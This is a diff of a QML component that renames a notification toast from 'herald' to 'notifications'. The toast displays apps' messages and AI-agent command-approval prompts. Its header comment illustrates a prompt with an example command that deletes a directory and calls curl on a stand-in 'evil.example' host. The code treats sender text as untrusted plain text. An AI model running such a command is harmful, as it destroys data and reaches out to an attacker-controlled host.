@@ -1,32 +1,32 @@
-// HeraldBody.qml — everything the cadenza herald toast draws (intent §3.7).
+// NotificationsBody.qml — everything the cadenza notifications toast draws (intent §3.7).
 //
-//     herald ▸ claude · SUMMONS                 14:02
+//     notifications ▸ claude · SUMMONS                 14:02
 //     minerva-owl wants to run a command
 //     “Bash: rm -rf target/ && curl https://evil.example/…”
 //     [y] approve  [n] deny
 //
-//     herald ▸ firefox                          14:02
+//     notifications ▸ firefox                          14:02
 //     Download finished
 //     “<b>report.pdf</b> — open https://…”
 //
 // Borderless blocks (kit `Block`) stacked top-right under the bar, the
-// transient cousin of the board's NOTIF tab: the same `herald ▸ <app>` label,
+// transient cousin of the board's NOTIF tab: the same `notifications ▸ <app>` label,
 // the same quoted plain body, the same `[y] approve [n] deny` words.
 //
-// A HELPER (uppercase — never a slot). `herald.qml` is the thin PanelWindow
+// A HELPER (uppercase — never a slot). `notifications.qml` is the thin PanelWindow
 // shell (namespace, layer, anchors, visibility) and loads this body BY URL
 // (design/kit.md §1); the preview canvas loads it directly, since the canvas
 // refuses a PanelWindow root.
 //
 // ── DATA ──────────────────────────────────────────────────────────────────
-// Read-only: `state/stage/herald.json` (CONTRACTS §4), watched. Newest is
+// Read-only: `state/stage/notifications.json` (CONTRACTS §4), watched. Newest is
 // LAST in the file. The stage dir resolves exactly as BoardBody's does
 // (AOIDE_STAGE_DIR / AOIDE_STATE_DIR, else under AOIDE_ROOT). Sender text is
 // UNTRUSTED DATA (house rule 4): every Text is PlainText, control characters
 // are flattened, the body is quoted and wrapped, nothing is linkified or
 // actionable.
 //
-// ── THE DISMISS CLOCK (sonata herald.qml's contract) ──────────────────────
+// ── THE DISMISS CLOCK (sonata notifications.qml's contract) ──────────────────────
 // The toast owns expiry. Each record carries `timeoutMs` (0 = never — every
 // summons and every critical). A lapsed record leaves the toast but stays in
 // the file for the board's NOTIF tab; nothing daemon-side expires it.
@@ -39,8 +39,8 @@
 // past its timeout lapses in `ingest`, before anything is drawn.
 //
 // ── THE WIRE (the only two commands, sonata's exact shapes) ───────────────
-//   click a toast              → { cmd: "heralddismiss", id: <record id> }
-//   [y] / [n] on a summons     → { cmd: "heraldverdict", id: <sessionId>,
+//   click a toast              → { cmd: "notificationsdismiss", id: <record id> }
+//   [y] / [n] on a summons     → { cmd: "notificationsverdict", id: <sessionId>,
 //                                  verdict: "approve" | "deny" }
 // A summons clicked off its [y]/[n] is only waved off the screen (a local
 // lapse): the agent behind it is still blocked, so it stays on the board.
@@ -102,13 +102,13 @@ Item {
 
     property var records: []
     FileView {
-        id: heraldFile
-        path: root.stageDir + "/herald.json"
+        id: notificationsFile
+        path: root.stageDir + "/notifications.json"
         watchChanges: true; blockLoading: false; printErrors: false
         onFileChanged: reload()
         onLoaded: {
             var d = null
-            try { d = JSON.parse(heraldFile.text()) } catch (e) { return }   // garbage → hold what we have
+            try { d = JSON.parse(notificationsFile.text()) } catch (e) { return }   // garbage → hold what we have
             root.ingest((d && d.notifications) ? d.notifications : [])
         }
         onLoadFailed: root.ingest([])
@@ -168,10 +168,10 @@ Item {
 
     // ── the wire ──────────────────────────────────────────────────────────
     function dismiss(id) {
-        if (root.bridge) root.bridge.sendCommand({ cmd: "heralddismiss", id: "" + id })
+        if (root.bridge) root.bridge.sendCommand({ cmd: "notificationsdismiss", id: "" + id })
     }
     function verdict(sessionId, word) {
-        if (root.bridge) root.bridge.sendCommand({ cmd: "heraldverdict", id: "" + sessionId, verdict: word })
+        if (root.bridge) root.bridge.sendCommand({ cmd: "notificationsverdict", id: "" + sessionId, verdict: word })
     }
     function wave(id) {
         var lp = root.lapsed
@@ -210,7 +210,7 @@ Item {
                 kit: root.kit; helper: "Block"
                 props: ({
                     cols: root.cols,
-                    label: "herald ▸ " + root.flat(rec.r.app || "?") + (rec.summons ? " · SUMMONS" : ""),
+                    label: "notifications ▸ " + root.flat(rec.r.app || "?") + (rec.summons ? " · SUMMONS" : ""),
                     tone: (rec.summons || rec.critical) ? root.kit.urgent : root.kit.dim,
                     stamp: root.hhmm(rec.r.receivedAt),
                     content: recBody
